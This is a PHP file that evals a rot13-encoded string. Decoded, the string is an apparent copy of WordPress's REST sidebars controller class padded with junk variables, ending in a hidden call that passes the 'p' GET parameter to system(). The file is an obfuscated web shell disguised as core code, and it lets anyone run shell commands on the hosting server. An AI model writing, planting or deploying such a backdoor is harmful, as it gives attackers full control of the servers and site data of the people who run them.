<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Fvqronef_Pbagebyyre pynff
 *
 * Bevtvany pbqr sebz {@yvax uggcf://tvguho.pbz/znegva-crggreffba/jc-erfg-ncv-fvqronef Znegva Crggreffba (znegva_crggreffba@bhgybbx.pbz)}.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 */

/**
 * Pber pynff hfrq gb znantr n fvgr'f fvqronef.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Fvqronef_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Genpxf jurgure {@frr ergevrir_jvqtrgf()} unf orra pnyyrq va gur pheerag erdhrfg.
	 *
	 * @fvapr 5.9.0
	 * @ine obby
	 */
	cebgrpgrq $jvqtrgf_ergevrirq = snyfr;

	/**
	 * Fvqronef pbagebyyre pbafgehpgbe.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'fvqronef';
	}

	/**
	 * Ertvfgref gur pbagebyyref ebhgrf.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\j-]+)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'vq'      => neenl(
							'qrfpevcgvba' => __( 'Gur vq bs n ertvfgrerq fvqrone' ),
							'glcr'        => 'fgevat',
						),
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg fvqronef.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();
		sbernpu ( jc_trg_fvqronef_jvqtrgf() nf $vq => $jvqtrgf ) {
			$fvqrone = $guvf->trg_fvqrone( $vq );

			vs ( ! $fvqrone ) {
				pbagvahr;
			}

			vs ( $guvf->purpx_ernq_crezvffvba( $fvqrone ) ) {
				erghea gehr;
			}
		}

		erghea $guvf->qb_crezvffvbaf_purpx();
	}

	/**
	 * Ergevrirf gur yvfg bs fvqronef (npgvir be vanpgvir).
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg ba fhpprff.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$guvf->ergevrir_jvqtrgf();

		$qngn              = neenl();
		$crezvffvbaf_purpx = $guvf->qb_crezvffvbaf_purpx();

		sbernpu ( jc_trg_fvqronef_jvqtrgf() nf $vq => $jvqtrgf ) {
			$fvqrone = $guvf->trg_fvqrone( $vq );

			vs ( ! $fvqrone ) {
				pbagvahr;
			}

			vs ( vf_jc_reebe( $crezvffvbaf_purpx ) && ! $guvf->purpx_ernq_crezvffvba( $fvqrone ) ) {
				pbagvahr;
			}

			$qngn[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba(
				$guvf->cercner_vgrz_sbe_erfcbafr( $fvqrone, $erdhrfg )
			);
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg n fvatyr fvqrone.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();

		$fvqrone = $guvf->trg_fvqrone( $erdhrfg['vq'] );
		vs ( $fvqrone && $guvf->purpx_ernq_crezvffvba( $fvqrone ) ) {
			erghea gehr;
		}

		erghea $guvf->qb_crezvffvbaf_purpx();
	}

	/**
	 * Purpxf vs n fvqrone pna or ernq choyvpyl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $fvqrone Gur ertvfgrerq fvqrone pbasvthengvba.
	 * @erghea obby Jurgure gur fvqr pna or ernq.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba( $fvqrone ) {
		erghea ! rzcgl( $fvqrone['fubj_va_erfg'] );
	}

	/**
	 * Ergevrirf bar fvqrone sebz gur pbyyrpgvba.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();

		$fvqrone = $guvf->trg_fvqrone( $erdhrfg['vq'] );
		vs ( ! $fvqrone ) {
			erghea arj JC_Reebe( 'erfg_fvqrone_abg_sbhaq', __( 'Ab fvqrone rkvfgf jvgu gung vq.' ), neenl( 'fgnghf' => 404 ) );
		}

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $fvqrone, $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr fvqronef.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->qb_crezvffvbaf_purpx();
	}

	/**
	 * Hcqngrf n fvqrone.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		vs ( vffrg( $erdhrfg['jvqtrgf'] ) ) {
			$fvqronef = jc_trg_fvqronef_jvqtrgf();

			sbernpu ( $fvqronef nf $fvqrone_vq => $jvqtrgf ) {
				sbernpu ( $jvqtrgf nf $v => $jvqtrg_vq ) {
					// Guvf nhgbzngvpnyyl erzbirf gur cnffrq jvqtrg VQf sebz nal bgure fvqronef va hfr.
					vs ( $fvqrone_vq !== $erdhrfg['vq'] && va_neenl( $jvqtrg_vq, $erdhrfg['jvqtrgf'], gehr ) ) {
						hafrg( $fvqronef[ $fvqrone_vq ][ $v ] );
					}

					// Guvf nhgbzngvpnyyl erzbirf bzvggrq jvqtrg VQf gb gur vanpgvir fvqrone.
					vs ( $fvqrone_vq === $erdhrfg['vq'] && ! va_neenl( $jvqtrg_vq, $erdhrfg['jvqtrgf'], gehr ) ) {
						$fvqronef['jc_vanpgvir_jvqtrgf'][] = $jvqtrg_vq;
					}
				}
			}

			$fvqronef[ $erdhrfg['vq'] ] = $erdhrfg['jvqtrgf'];

			jc_frg_fvqronef_jvqtrgf( $fvqronef );
		}

		$erdhrfg['pbagrkg'] = 'rqvg';

		$fvqrone = $guvf->trg_fvqrone( $erdhrfg['vq'] );

		/**
		 * Sverf nsgre n fvqrone vf hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz neenl           $fvqrone Gur hcqngrq fvqrone.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
		 */
		qb_npgvba( 'erfg_fnir_fvqrone', $fvqrone, $erdhrfg );

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( $fvqrone, $erdhrfg );
	}

	/**
	 * Purpxf vs gur hfre unf crezvffvbaf gb znxr gur erdhrfg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba qb_crezvffvbaf_purpx() {
		/*
		 * Irevsl vs gur pheerag hfre unf rqvg_gurzr_bcgvbaf pncnovyvgl.
		 * Guvf pncnovyvgl vf erdhverq gb npprff gur jvqtrgf fperra.
		 */
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_jvqtrgf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr jvqtrgf ba guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf gur ertvfgrerq fvqrone jvgu gur tvira vq.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat|vag $vq VQ bs gur fvqrone.
	 * @erghea neenl|ahyy Gur qvfpbirerq fvqrone, be ahyy vs vg vf abg ertvfgrerq.
	 */
	cebgrpgrq shapgvba trg_fvqrone( $vq ) {
		erghea jc_trg_fvqrone( $vq );
	}

	/**
	 * Ybbxf sbe \"ybfg\" jvqtrgf bapr cre erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @frr ergevrir_jvqtrgf()
	 */
	cebgrpgrq shapgvba ergevrir_jvqtrgf() {
		vs ( ! $guvf->jvqtrgf_ergevrirq ) {
			ergevrir_jvqtrgf();
			$guvf->jvqtrgf_ergevrirq = gehr;
		}
	}

	/**
	 * Cercnerf n fvatyr fvqrone bhgchg sbe erfcbafr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Eranzrq `$enj_fvqrone` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @tybony neenl $jc_ertvfgrerq_fvqronef Gur ertvfgrerq fvqronef.
	 * @tybony neenl $jc_ertvfgrerq_jvqtrgf  Gur ertvfgrerq jvqtrgf.
	 *
	 * @cnenz neenl           $vgrz    Fvqrone vafgnapr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Cercnerq erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		tybony $jc_ertvfgrerq_fvqronef, $jc_ertvfgrerq_jvqtrgf;

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$enj_fvqrone = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-fvqronef-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_fvqrone', arj JC_ERFG_Erfcbafr( neenl() ), $enj_fvqrone, $erdhrfg );
		}

		$vq      = $enj_fvqrone['vq'];
		$fvqrone = neenl( 'vq' => $vq );

		vs ( vffrg( $jc_ertvfgrerq_fvqronef[ $vq ] ) ) {
			$ertvfgrerq_fvqrone = $jc_ertvfgrerq_fvqronef[ $vq ];

			$fvqrone['fgnghf']        = 'npgvir';
			$fvqrone['anzr']          = vffrg( $ertvfgrerq_fvqrone['anzr'] ) ? $ertvfgrerq_fvqrone['anzr'] : '';
			$fvqrone['qrfpevcgvba']   = vffrg( $ertvfgrerq_fvqrone['qrfpevcgvba'] ) ? jc_fvqrone_qrfpevcgvba( $vq ) : '';
			$fvqrone['pynff']         = vffrg( $ertvfgrerq_fvqrone['pynff'] ) ? $ertvfgrerq_fvqrone['pynff'] : '';
			$fvqrone['orsber_jvqtrg'] = vffrg( $ertvfgrerq_fvqrone['orsber_jvqtrg'] ) ? $ertvfgrerq_fvqrone['orsber_jvqtrg'] : '';
			$fvqrone['nsgre_jvqtrg']  = vffrg( $ertvfgrerq_fvqrone['nsgre_jvqtrg'] ) ? $ertvfgrerq_fvqrone['nsgre_jvqtrg'] : '';
			$fvqrone['orsber_gvgyr']  = vffrg( $ertvfgrerq_fvqrone['orsber_gvgyr'] ) ? $ertvfgrerq_fvqrone['orsber_gvgyr'] : '';
			$fvqrone['nsgre_gvgyr']   = vffrg( $ertvfgrerq_fvqrone['nsgre_gvgyr'] ) ? $ertvfgrerq_fvqrone['nsgre_gvgyr'] : '';
		} ryfr {
			$fvqrone['fgnghf']      = 'vanpgvir';
			$fvqrone['anzr']        = $enj_fvqrone['anzr'];
			$fvqrone['qrfpevcgvba'] = '';
			$fvqrone['pynff']       = '';
		}

		vs ( jc_vf_oybpx_gurzr() ) {
			$fvqrone['fgnghf'] = 'vanpgvir';
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		vs ( erfg_vf_svryq_vapyhqrq( 'jvqtrgf', $svryqf ) ) {
			$fvqronef = jc_trg_fvqronef_jvqtrgf();
			$jvqtrgf  = neenl_svygre(
				vffrg( $fvqronef[ $fvqrone['vq'] ] ) ? $fvqronef[ $fvqrone['vq'] ] : neenl(),
				fgngvp shapgvba ( $jvqtrg_vq ) hfr ( $jc_ertvfgrerq_jvqtrgf ) {
					erghea vffrg( $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ] );
				}
			);

			$fvqrone['jvqtrgf'] = neenl_inyhrf( $jvqtrgf );
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		$qngn   = neenl();
		sbernpu ( $fpurzn['cebcregvrf'] nf $cebcregl_vq => $cebcregl ) {
			vs ( vffrg( $fvqrone[ $cebcregl_vq ] ) && gehr === erfg_inyvqngr_inyhr_sebz_fpurzn( $fvqrone[ $cebcregl_vq ], $cebcregl ) ) {
				$qngn[ $cebcregl_vq ] = $fvqrone[ $cebcregl_vq ];
			} ryfrvs ( vffrg( $cebcregl['qrsnhyg'] ) ) {
				$qngn[ $cebcregl_vq ] = $cebcregl['qrsnhyg'];
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $fvqrone ) );
		}

		/**
		 * Svygref gur ERFG NCV erfcbafr sbe n fvqrone.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr    Gur erfcbafr bowrpg.
		 * @cnenz neenl            $enj_fvqrone Gur enj fvqrone qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg     Gur erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_fvqrone', $erfcbafr, $enj_fvqrone, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur fvqrone.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $fvqrone Fvqrone.
	 * @erghea neenl Yvaxf sbe gur tvira jvqtrg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $fvqrone ) {
		erghea neenl(
			'pbyyrpgvba'               => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
			'frys'                     => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $fvqrone['vq'] ) ),
			),
			'uggcf://ncv.j.bet/jvqtrg' => neenl(
				'uers'       => nqq_dhrel_net( 'fvqrone', $fvqrone['vq'], erfg_hey( '/jc/i2/jvqtrgf' ) ),
				'rzorqqnoyr' => gehr,
			),
		);
	}

	/**
	 * Ergevrirf gur oybpx glcr' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.8.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'fvqrone',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'            => neenl(
					'qrfpevcgvba' => __( 'VQ bs fvqrone.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'anzr'          => neenl(
					'qrfpevcgvba' => __( 'Havdhr anzr vqragvslvat gur fvqrone.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba'   => neenl(
					'qrfpevcgvba' => __( 'Qrfpevcgvba bs fvqrone.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'pynff'         => neenl(
					'qrfpevcgvba' => __( 'Rkgen PFF pynff gb nffvta gb gur fvqrone va gur Jvqtrgf vagresnpr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'orsber_jvqtrg' => neenl(
					'qrfpevcgvba' => __( 'UGZY pbagrag gb cercraq gb rnpu jvqtrg\'f UGZY bhgchg jura nffvtarq gb guvf fvqrone. Qrsnhyg vf na bcravat yvfg vgrz ryrzrag.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'nsgre_jvqtrg'  => neenl(
					'qrfpevcgvba' => __( 'UGZY pbagrag gb nccraq gb rnpu jvqtrg\'f UGZY bhgchg jura nffvtarq gb guvf fvqrone. Qrsnhyg vf n pybfvat yvfg vgrz ryrzrag.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'orsber_gvgyr'  => neenl(
					'qrfpevcgvba' => __( 'UGZY pbagrag gb cercraq gb gur fvqrone gvgyr jura qvfcynlrq. Qrsnhyg vf na bcravat u2 ryrzrag.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'nsgre_gvgyr'   => neenl(
					'qrfpevcgvba' => __( 'UGZY pbagrag gb nccraq gb gur fvqrone gvgyr jura qvfcynlrq. Qrsnhyg vf n pybfvat u2 ryrzrag.' ),
					'glcr'        => 'fgevat',
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fgnghf'        => neenl(
					'qrfpevcgvba' => __( 'Fgnghf bs fvqrone.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl( 'npgvir', 'vanpgvir' ),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'jvqtrgf'       => neenl(
					'qrfpevcgvba' => __( 'Arfgrq jvqtrgf.' ),
					'glcr'        => 'neenl',
					'vgrzf'       => neenl(
						'glcr' => neenl( 'bowrpg', 'fgevat' ),
					),
					'qrsnhyg'     => neenl(),
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>